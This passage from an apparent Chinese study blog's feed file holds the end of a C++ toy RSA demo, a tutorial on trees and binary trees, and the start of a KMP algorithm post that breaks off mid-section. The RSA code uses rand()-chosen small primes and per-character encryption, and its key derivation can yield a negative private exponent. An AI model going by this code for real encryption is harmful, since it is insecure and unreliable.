      <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">//随机产生两个素数p，q</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">Create_Prime</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">pq</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>;<br>    pq[<span class="hljs-number">0</span>] = <span class="hljs-built_in">rand</span>();<br>    pq[<span class="hljs-number">1</span>] = <span class="hljs-built_in">rand</span>();<br><span class="hljs-keyword">while</span> (!(<span class="hljs-built_in">Isprime</span>(pq[<span class="hljs-number">0</span>]) &amp;&amp; <span class="hljs-built_in">Isprime</span>(pq[<span class="hljs-number">1</span>]))) &#123;<br>        pq[<span class="hljs-number">0</span>] = <span class="hljs-built_in">rand</span>();<br>        pq[<span class="hljs-number">1</span>] = <span class="hljs-built_in">rand</span>();<br>&#125;<br><span class="hljs-keyword">return</span> pq;<br>&#125;<br><br><span class="hljs-comment">//最大公约数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span>&amp; x, <span class="hljs-type">int</span> &amp;y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; b) <br>        <span class="hljs-built_in">swap</span>(a, b);<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>)&#123;<br>        x = <span class="hljs-number">1</span>;<br>        y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-built_in">gcd</span>(b, a % b,x,y);<br>    <span class="hljs-type">int</span> temp = x;<br>    x = y;<br>    y = temp - a / b * y;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">//快速幂运算</span><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">quickPow</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> m, <span class="hljs-type">int</span> e, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">1</span>;<br>    m = m % n;<br>    <span class="hljs-keyword">while</span> (e &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (e % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <br>            sum = (sum * m) % n;<br>        e = e / <span class="hljs-number">2</span>;<br>        m = (m*m) % n; <br>    &#125;<br>    <span class="hljs-keyword">if</span> (sum &lt; <span class="hljs-number">0</span>) <br>        sum = sum + n;<br><br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <br>    cout &lt;&lt; <span class="hljs-string">&quot;step 1 : 公私密钥产生&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">pq</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>;<br>    pq = <span class="hljs-built_in">Create_Prime</span>();<br>    <span class="hljs-type">int</span> p = pq[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">int</span> q = pq[<span class="hljs-number">1</span>];<br>    cout &lt;&lt; <span class="hljs-string">&quot; 质数p=  &quot;</span>&lt;&lt;pq[<span class="hljs-number">0</span>] &lt;&lt;<span class="hljs-string">&quot;   &quot;</span> &lt;&lt;<span class="hljs-string">&quot;质数q= &quot;</span>&lt;&lt; pq[<span class="hljs-number">1</span>]&lt;&lt;endl;<br>    <span class="hljs-type">int</span> n = p * q;<br>    <span class="hljs-type">int</span> phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-comment">// 获得公钥e;</span><br>    <span class="hljs-type">int</span> e = <span class="hljs-built_in">rand</span>()%phi_n;<br>    <span class="hljs-comment">//公钥e必须要跟φ(n)互素</span><br>    <span class="hljs-type">int</span> x,y;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">gcd</span>(phi_n,e,x,y) != <span class="hljs-number">1</span>) <br>        e = <span class="hljs-built_in">rand</span>() % phi_n;<br>    cout &lt;&lt; <span class="hljs-string">&quot; 公钥e= &quot;</span> &lt;&lt; e &lt;&lt;endl;<br>    <span class="hljs-type">int</span> d = y % phi_n;<br>    cout &lt;&lt; <span class="hljs-string">&quot; 私钥d= &quot;</span> &lt;&lt; d &lt;&lt;endl;<br><br>    cout &lt;&lt;<span class="hljs-string">&quot;-----------------------------------------&quot;</span>&lt;&lt;endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;step 2: 加密 &quot;</span>&lt;&lt;endl;<br>    string s;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入明文：&quot;</span>;<br>    <span class="hljs-built_in">getline</span>(cin, s);<br>    <span class="hljs-type">int</span> s_len = s.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">m</span><span class="hljs-params">(s_len)</span></span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; <span class="hljs-title">encode_m</span><span class="hljs-params">(s_len)</span></span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;密文为：&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s_len; i++)&#123;<br>        m[i] = s[i];<br>        encode_m[i] = <span class="hljs-built_in">quickPow</span>(m[i], e, n);<br>        cout &lt;&lt; encode_m[i];<br>    &#125;<br>    cout &lt;&lt; endl&lt;&lt;endl;<br><br>    cout &lt;&lt;<span class="hljs-string">&quot;-----------------------------------------&quot;</span>&lt;&lt;endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;step 3: 解密 &quot;</span>&lt;&lt;endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;解密结果为：&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s_len; i++) &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> outcode_m = <span class="hljs-built_in">quickPow</span>(encode_m[i], d, n);<br>        cout  &lt;&lt; <span class="hljs-built_in">char</span>(outcode_m);<br>    &#125;<br>    cout &lt;&lt; endl&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构--树</title>
    <link href="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/"/>
    <url>/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h2 id="一、数据结构—树"><a href="#一、数据结构—树" class="headerlink" title="一、数据结构—树"></a>一、数据结构—树</h2><h3 id="1-1-树的定义"><a href="#1-1-树的定义" class="headerlink" title="1.1 树的定义"></a>1.1 树的定义</h3><p>树是n(n&gt;=0)个节点的有限集，n=0时称为空树。在任意一棵非空树中：（1）有且仅有一个特定的称为根的节点；（2）当n&gt;1的时候，其余节点可分为m(m&gt;0)个互不相交的有限集T ~1~，T~2~，……，T~m~，其中每一个集合本身又是一棵树，并且称为根的子树，如图：</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308143056394.png" alt="树"></p><h3 id="1-2-结点分类"><a href="#1-2-结点分类" class="headerlink" title="1.2 结点分类"></a>1.2 结点分类</h3><p>结点拥有的子树数称为结点的<code>度</code></p><p>度为0的节点称为叶节点或者终端节点</p><p>度不为0的节点称为非终端节点或分支节点</p><p>除了根节点之外，分支节点也称为内部节点。</p><p>树的度是树内各节点的度的最大值</p><h3 id="1-3-节点间关系"><a href="#1-3-节点间关系" class="headerlink" title="1.3 节点间关系"></a>1.3 节点间关系</h3><p>节点的子树的根称为该节点的孩子，该节点称为孩子的双亲</p><p>同一个双亲的孩子之间互称兄弟</p><p>节点的祖先是从根到该节点所经分支上的所有节点，某节点为根的子树中的任一节点都称为该节点的子孙。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308143802564.png" alt="节点间关系"></p><p>结点的层次是从根开始定义起，根为第一层，根的孩子为第二层……</p><p>树中结点的最大层次称为树的深度或高度，上图中树的深度就为4</p><p><code>线性结构与树结构的区别</code></p><p>线性结构：第一个元素无前驱，中间元素既有前驱也有后继，最后一个元素无后继</p><p>树结构：根节点无双亲，有孩子；中间节点有双亲也有孩子；叶子节点无孩子，有双亲</p><h3 id="1-4-树的存储结构"><a href="#1-4-树的存储结构" class="headerlink" title="1.4 树的存储结构"></a>1.4 树的存储结构</h3><p>树的结构的表示方法：<code>双亲表示法</code>、<code>孩子表示法</code>、<code>孩子兄弟表示法</code></p><h4 id="1-4-1-双亲节点表示法"><a href="#1-4-1-双亲节点表示法" class="headerlink" title="1.4.1 双亲节点表示法"></a>1.4.1 双亲节点表示法</h4><p>每一个结点中，附设一个指示器指示其双亲结点到链表中的位置。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144210730.png" alt="双亲结点结构"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144629251.png" alt="image-20230308144629251"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144639401.png" alt="image-20230308144639401"></p><p>双亲表示法的好处很容易可以知道某个节点的双亲节点（O（1）），但是如果想要知道节点的孩子是什么，那就需要遍历整个结构。双亲表示法无法体现兄弟之间的关系</p><h4 id="1-4-2-孩子表示法"><a href="#1-4-2-孩子表示法" class="headerlink" title="1.4.2 孩子表示法"></a>1.4.2 孩子表示法</h4><p>由于树中每个结点可能有多棵子树，考虑使用多重链表，每个结点有多个指针域，其中每个指针指向一棵子树的根节点，这种方法叫做多重链表表示法。</p><p>方案一：指针域的个数等于树的度</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144908084.png" alt="image-20230308144908084"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308144919449.png" alt="image-20230308144919449"></p><p>但是这种方式对于树中各结点的度相差很大的时候，这种方法是很浪费空间的，因为有很多的结点他的指针域都是空的，不过如果树的各结点度相差很小的时候，那就意味着开辟的空间被充分利用了</p><p>方案二：指针域的个数等于该结点的度</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308145148687.png" alt="image-20230308145148687"></p><p>data是数据域，degree是度域，也就是存储该结点的孩子结点的个数，child1-childd为指针域，指向该结点的各个孩子的结点。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308145312109.png" alt="image-20230308145312109"></p><p>这种方法克服了浪费空间的缺点，对空间利用率确实很高，但是由于各个结点的链表是不相同的结构，加上要维护结点的度的数值，在运算上就会带来时间上的损耗。</p><p>结合这两种方法，得到了<code>孩子表示法</code></p><p>把每个结点的孩子排列起来，以单链表作存储结构，则n个结点有n个孩子链表，如果是叶子结点则此单链表为空，然后n个头指针又组成一个线性表，采用顺序存储结构，存放进一个一维数组中</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150232650.png" alt="image-20230308150232650"></p><p>设计两种结点结构，一个是孩子链表的孩子结点</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150313401.png" alt="image-20230308150313401"></p><p>另一个是表头数组的表头结点</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150341903.png" alt="image-20230308150341903"></p><p>但是这样的结构对于我们要查找某个结点的某个孩子，或者找某个结点的兄弟，只需要查找这个结点的孩子单链表即可。但是如何知道某个结点的双亲是谁呢？很麻烦，需要遍历整个树才行</p><p>所以推出了双亲孩子表示法</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308150655257.png" alt="image-20230308150655257"></p><h4 id="1-4-3-孩子兄弟表示法"><a href="#1-4-3-孩子兄弟表示法" class="headerlink" title="1.4.3 孩子兄弟表示法"></a>1.4.3 孩子兄弟表示法</h4><p>对于任意一棵树，它的结点的第一个孩子如果存在就是唯一的，它的右兄弟如果存在也是唯一的。因此我们设置两个指针，分别指向该结点的第一个孩子和此结点的右兄弟</p><p>结点结构如下：</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308151735881.png" alt="image-20230308151735881"></p><p><code>data</code>是数据域，<code>firstchild</code>为指针域，存储该结点的第一个孩子结点的存储地址，<code>rightsib</code>是指针域，存储该结点的右兄弟结点的存储地址</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308152116686.png" alt="image-20230308152116686"></p><p>这种表示法，给查找某个结点的某个孩子带来了方便，只需要通过firstchild找到此结点的长子，然后通过长子结点的rightsib找到他的二弟，接着一直找下去，直到找到具体的孩子。</p><p>将其进行变形，就是一棵二叉树</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308152909086.png" alt="image-20230308152909086"></p><h2 id="二、二叉树"><a href="#二、二叉树" class="headerlink" title="二、二叉树"></a>二、二叉树</h2><p>二叉树是n（n&gt;=0)个结点的有限集合，该集合或者为空集，或者由一个根结点和两棵互不相交的，分别称为根结点的左子树和右子树的二叉树组成。</p><h3 id="2-1-特点"><a href="#2-1-特点" class="headerlink" title="2.1 特点"></a>2.1 特点</h3><p>（1）每个结点最多只有两棵子树，所以二叉树中不存在度大于2的结点。</p><p>（2）左子树和右子树是有顺序的</p><p>（3）即使树中某个结点只有一棵子树，也要区分他是左子树还是右子树</p><p>五种形态：<code>空二叉树</code>，<code>只有一个根结点</code>，<code>根结点只有左子树</code>，<code>根节点只有右子树</code>，<code>根结点既有左子树又有右子树</code>。</p><h3 id="2-2-特殊二叉树"><a href="#2-2-特殊二叉树" class="headerlink" title="2.2 特殊二叉树"></a>2.2 特殊二叉树</h3><p><strong>斜树</strong>：所有结点都只有左子树的二叉树叫左斜树。所有结点都是只有右子树的二叉树叫右斜树。统称斜树</p><p><strong>满二叉树</strong>：在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层中上，这样的二叉树称为满二叉树。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308153739114.png" alt="满二叉树"></p><p>满二叉树的特点：</p><p>（1）叶子只能出现在最下一层。</p><p>（2）非叶子结点的度一定是2。</p><p>（3）在同样深度的二叉树中，满二叉树的结点个数最多，叶子树最多</p><p><strong>完全二叉树</strong>：对一棵具有n个结点的二叉树按层编号，如果编号为i的结点与同样深度的满二叉树中编号为i的结点在二叉树中位置完全相同，则这棵二叉树称为完全二叉树</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308154038901.png" alt="image-20230308154038901"></p><p>完全二叉树的特点：</p><p>（1）叶子结点只能出现在最下两层</p><p>（2）最下层的叶子一定集中在左部连续位置</p><p>（3）倒数二层，若有叶子结点，一定都在右部连续位置</p><p>（4）如果结点度为1，则该结点只有左孩子，即不存在只有右子树的情况</p><p>（5）同样结点数的二叉树，完全二叉树的深度最小</p><h2 id="三、性质"><a href="#三、性质" class="headerlink" title="三、性质"></a>三、性质</h2><p>性质1：在二叉树的第i层上至多有2^i-1^个结点（i&gt;=1)</p><p>性质2：深度为k的二叉树至多有2^k^-1个结点</p><p>性质3：对任何一棵二叉树T，如果其终端结点数为n~0~，度为2的结点数为n~2~，则n~0~=n~2~+1</p><p>性质4：具有n个结点的完全二叉树的深度为⌊log~2~n⌋+1</p><p>性质5：如果对一棵有n个结点的完全二叉树的结点按层序编号（从第1层到⌊log~2~n⌋+1层，每层从左到右），对任一结点i（1&lt;=i&lt;=n）有</p><p>（1）如果i=1,则结点i是二叉树的根，无双亲；如果i&gt;1，则其双亲是结点⌊i/2⌋。</p><p>（2）如果2i&gt;n，则结点i无左孩子；否则其左孩子是结点2i</p><p>（3）如果2i+1&gt;n，则结点i无右孩子；否则其右孩子是结点2i+1</p><h2 id="四、存储结构"><a href="#四、存储结构" class="headerlink" title="四、存储结构"></a>四、存储结构</h2><h3 id="4-1-顺序存储"><a href="#4-1-顺序存储" class="headerlink" title="4.1 顺序存储"></a>4.1 顺序存储</h3><p>用一维数组存储二叉树中的结点，并且结点的存储位置，也就是数组的下标要能体现结点之间的逻辑关系。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182008141.png" alt="image-20230308182008141"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182016273.png" alt="image-20230308182016273"></p><p>但是考虑一棵深度为k的右斜树，它只有k个结点，却要分配2^k^-1个存储单元空间，这对于空间开销是很大的，如下图</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182238012.png" alt="右斜树"></p><h3 id="4-2-二叉链表"><a href="#4-2-二叉链表" class="headerlink" title="4.2 二叉链表"></a>4.2 二叉链表</h3><p>二叉树每个结点最多有两个孩子，所以为它设计一个数据域和两个指针域，这样的链表叫做二叉链表。</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182408631.png" alt="image-20230308182408631"></p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182435301.png" alt="image-20230308182435301"></p><h2 id="五、遍历二叉树"><a href="#五、遍历二叉树" class="headerlink" title="五、遍历二叉树"></a>五、遍历二叉树</h2><p>二叉树的遍历是指从根节点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点都访问依次且仅被访问一次</p><h3 id="5-1-前序遍历"><a href="#5-1-前序遍历" class="headerlink" title="5.1 前序遍历"></a>5.1 前序遍历</h3><p>规则是若二叉树为空，则空操作返回，否则先访问根结点，然后前序遍历左子树，再前序遍历右子树。即：根、左、右</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308182747368.png" alt="image-20230308182747368"></p><p>该图的前序遍历结果应该为：<strong>ABDGHCEIF</strong></p><h3 id="5-2-中序遍历"><a href="#5-2-中序遍历" class="headerlink" title="5.2 中序遍历"></a>5.2 中序遍历</h3><p>规则是若树为空，则空操作返回，否则从根结点开始（注意不是先访问根节点），中序遍历根节点的左子树，然后访问根节点，最后中序遍历右子树。即：左、根、右</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308183005863.png" alt="image-20230308183005863"></p><p>该图的中序遍历结果应该为：<strong>GDHBAEICF</strong></p><h3 id="5-3-后序遍历"><a href="#5-3-后序遍历" class="headerlink" title="5.3 后序遍历"></a>5.3 后序遍历</h3><p>规则是若树为空，则空操作返回，否则从左到右先叶子后结点的方式遍历左右子树，最后访问根节点。即：左、右、根</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308183236471.png" alt="image-20230308183236471"></p><p>该图的后序遍历结果应该为：<strong>GHDBIEFCA</strong></p><h3 id="5-4-层序遍历"><a href="#5-4-层序遍历" class="headerlink" title="5.4 层序遍历"></a>5.4 层序遍历</h3><p>规则是若树为空，则空操作返回，否则从树的第一层，也就是根结点开始访问，从上而下逐层遍历，在同一层中，按从左到右的顺序对结点逐个访问</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308183426890.png" alt="image-20230308183426890"></p><p>该图的层序遍历的结果应该为：<strong>ABCDEFGHI</strong></p><h3 id="5-5-推导遍历结果"><a href="#5-5-推导遍历结果" class="headerlink" title="5.5 推导遍历结果"></a>5.5 推导遍历结果</h3><p>已知一棵二叉树的前序遍历序列为：<strong>ABCDEF</strong></p><p>中序遍历序列为：<strong>CBAEDF</strong></p><p>请问这棵二叉树的后序遍历结果是多少：<strong>CBEFDA</strong></p><p>前序遍历是<strong>ABCDEF</strong>，所以说第一个字母A被打印出来，说明A是根结点的数据，在中序遍历中找到A，所以可以推出CB是在A的左子树部分，EDF是在A的右子树部分</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308194519188.png" alt="image-20230308194519188"></p><p>然后我们再次看前序中的C和B，他的顺序是A<strong>BC</strong>DEF，是先打印B后打印C，所以B应该是A的左孩子，而C就只能是B的孩子，此时是左还是右孩子还不确定，在看中序遍历<strong>CB</strong>AEDF，C是在B的前面打印，这说明C是B的左孩子</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308194944933.png" alt="image-20230308194944933"></p><p>对于E、D、F，同样道理处理，最后可以得到</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308195036083.png" alt="image-20230308195036083"></p><p>所以他的后序遍历结果就是：<strong>CBEFDA</strong></p><p>已知前序遍历和中序遍历序列，可以唯一确定一棵二叉树</p><p>已知后序遍历和中序遍历序列，可以唯一确定一棵二叉树</p><p>已知前序和后序遍历是无法确定一棵二叉树的，比如</p><p>前序序列：ABC</p><p>后序序列：CBA</p><p>我们可以确定A一定是根结点，但是我们接下来无法确定哪个结点是左子树，哪个是右子树</p><p><img src="/2023/03/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%91/image-20230308195346443.png" alt="image-20230308195346443"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>KMP算法</title>
    <link href="/2023/03/06/KMP%E7%AE%97%E6%B3%95/"/>
    <url>/2023/03/06/KMP%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h1><h2 id="一、KMP算法与朴素模式匹配算法的比较"><a href="#一、KMP算法与朴素模式匹配算法的比较" class="headerlink" title="一、KMP算法与朴素模式匹配算法的比较"></a>一、KMP算法与朴素模式匹配算法的比较</h2><p>KMP算法是一个字符串匹配的快速算法，在一个已知字符串中查找子串的位置，也叫做串的模式匹配。</p><p>例如：主串S=“<code>abcdehh</code>“，子串T=”<code>cde</code>“</p><p>当字符串长度很小的时候，自然很容易看出来，但是如果字符串是这样的”<code>askjdahksjdhalksdlakjdlkajsdlkaldacmee</code>“，就已经让人头痛了吧，用算法来做，很容易可以想到用暴力搜索匹配就行，就是从主串的第一个字符开始查询，进行匹配，如果不符合就到主串的第二个字符进行查询，直到找到子串。这种方法也就是<code>朴素模式匹配算法</code>。</p><p>朴素模式匹配算法在最好情况下时间复杂度为O(n)，即子串的n个字符正好等于主串的前n个字符，而最坏的情况下<strong>时间复杂度为O(m*n)</strong>。即找到最后一个子串才匹配成功。</p><p>而为了提高效率，我们推出了<strong>KMP</strong>算法，有一说一，这个算法非常烧脑</p><p>对于给定的一个主串：<strong>abcabdacbademc</strong>，一个给定的子串：<strong>abcabcm</strong></p><p>我们第一次比较必然是这样的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>a b c a b c m  <br></code></pre></td></tr></table></figure><p>发现在第6位字符不相同，接下来区别于朴素模式匹配算法的就在于子串该怎么移动</p><p>应该做如下移动</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>      a b c a b c m <br></code></pre></td></tr></table></figure><p>至于这么移动的合理性，可以自己进行推算，前面的比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>  a b c a b c m  <br></code></pre></td></tr></table></figure><p>这样的是绝对不可能匹配的，因为我们知道对于主串来说，a再次出现的位置在主串的第四位，也就是说在2,3位没有a，可子串是以a开头的，所以必然无法匹配。</p><h2 id="二、最长相等前后缀"><a href="#二、最长相等前后缀" class="headerlink" title="二、最长相等前后缀"></a>二、最长相等前后缀</h2><p>为了方便说明我们移动的具体位置，我们引入<strong>最长相等前后缀</strong>的概念</p><p><strong>abcab</strong></p><p>前缀集合：<strong>{a,ab,abc,abca}</strong></p><p>后缀集合：<strong>{b,ab,cab,bcab}</strong></p><p>最长相等前后缀为：<strong>ab</strong></p><p>对于第一次匹配</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>a b c a b c m <br></code></pre></td></tr></table></figure><p>相同部分是<strong>abcab</strong>，而它的最长相等前后缀是<strong>ab</strong>，而我们移动的结果就是让子串的最长相等前缀与主串相同部分的最长相等后缀对齐</p><p>即：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>      a b c a b c m <br></code></pre></td></tr></table></figure><p>完成这一步之后，接下来的流程就是一个循环过程。</p><p>现在重新捋一遍</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>a b c a b c m <br>           i=<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>这是第一遍比较，比较到第7位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a b c a b d a c b a d e m c<br>  a b c a b c m <br>         i=<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>第二遍比较，<strong>i</strong>依旧是<strong>7</strong>。</p><p>所以说我们其实是可以做到i一直增加，那我们只需要考虑<strong>j</strong>的变化了，而j的变化与主串其实没有什么关系，关键在于子串的结构中是否有重复的问题。</p><p>举两个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">example <span class="hljs-number">1</span>:<br>a b c d e f g a b...<br>a b c d e x<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">6</span><br><span class="hljs-comment">//下一次比较变成</span><br>a b c d e f g a b...<br>          a b c d e x<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">1</span><br>    <br>example <span class="hljs-number">2</span>:<br>a b c a b a b c a...<br>a b c a b x<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">6</span><br><span class="hljs-comment">//下一次比较变成</span><br>a b c a b a b c a...<br>      a b c a b x...<br>         i=<span class="hljs-number">6</span>,j=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="三、next数组"><a href="#三、next数组" class="headerlink" title="三、next数组"></a>三、next数组</h2><p>所以<strong>j</strong>的值得多少取决于当前字符之前的串的最长相等前后缀的长度</p><p>比如：<strong>example 1</strong>中，<strong>x</strong>字符之前的串是<strong>a b c d e</strong> ,最长相等前后缀长度为<strong>0</strong>，所以<strong>j</strong>变成<strong>1</strong></p><p>​            <strong>example 2</strong>中，<strong>x</strong>字符之前的串是<strong>a b c a b</strong> ,最长相等前后缀长度为<strong>2</strong>，所以<strong>j</strong>变成<strong>3</strong></p><p>这里用<strong>next[]</strong>数组来保存<strong>最长相等前后缀的长度+1</strong>的值</p><p>这里数组的值可能和上面的说法不一致，用的书上的说法</p><p><img src="/2023/03/06/KMP%E7%AE%97%E6%B3%95/image-20230307163142213.png" alt="image-20230307163142213"></p><p>举例：T=”abcdex”</p><p>当j=1，next[1]=0</p><p>当j=2，属于其他情况，next[2]=1</p><p>当j=3，属于其他情况，next[3]=1</p><p>当j=4，属于其他情况，next[4]=1</p><p>所以，此T串的next[j]为011111</p><h2 id="四、KMP算法的改进"><a 